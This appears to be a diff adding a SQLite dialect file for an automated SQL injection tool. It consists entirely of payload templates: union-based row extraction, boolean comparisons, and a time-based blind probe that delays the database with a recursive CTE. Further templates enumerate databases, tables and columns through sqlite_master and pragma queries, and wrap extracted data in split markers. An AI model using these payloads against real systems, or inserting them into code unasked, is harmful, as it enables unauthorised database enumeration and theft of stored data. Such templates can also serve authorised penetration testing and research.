@@ -1,0 +1,31 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:1
+UnionAll:1=2 union all select {cols}
+UnionData:1=2 union all select {cols} from {table}{where} limit 1 offset {rowIndex}
+UnionDataRows:1=2 union all select {fill} from (select group_concat(sqli_r,'') sqli_agg from (select {cols} sqli_r from {table}{where} limit {batchSize} offset {rowIndex}) sqli_t) sqli_x
+BoolData:{expr}>{value}
+DataSplitStr:_s_p_
+DataStartStr:data_
+DataEndStr:_data
+DBCount:(select count(1) from pragma_database_list)
+TableCount:(select count(1) from sqlite_master where type='table' and substr(tbl_name,1,7)<>'sqlite_')
+ColumnCount:(select count(1) from pragma_table_info({table}))
+DBName:(select name from pragma_database_list limit 1 offset 0)
+DBNames:(select group_concat(name) from pragma_database_list)
+TableName:(select tbl_name from sqlite_master where type='table' and substr(tbl_name,1,7)<>'sqlite_' limit 1 offset {index})
+TableNames:(select group_concat(tbl_name) from sqlite_master where type='table' and substr(tbl_name,1,7)<>'sqlite_')
+ColumnName:(select name from pragma_table_info({table}) limit 1 offset {index})
+ColumnNames:(select group_concat(name) from pragma_table_info({table}))
+Substr:substr(({expr}),{start},{len})
+Concat:{startMark}||{split}||{cols}||{split}||{endMark}
+Length:length({expr})
+Cast:cast({expr} as text)
+IfNull:coalesce({expr},char(32))
+Ascii:unicode({expr})
+Hex:hex({expr})
+SleepBoolData: (select case when ({cond}) then (with recursive cte_stk(x) as (select 1 union all select x+1 from cte_stk where x<{sleep}0000000) select count(*) from cte_stk) else 1 end)
+DataValue:(select {cols} from {table}{where} limit 1 offset {rowIndex})
+DataCount:(select count(1) from {table}{where})
+BlindStrategy: codepoint
+DnsChannel: no
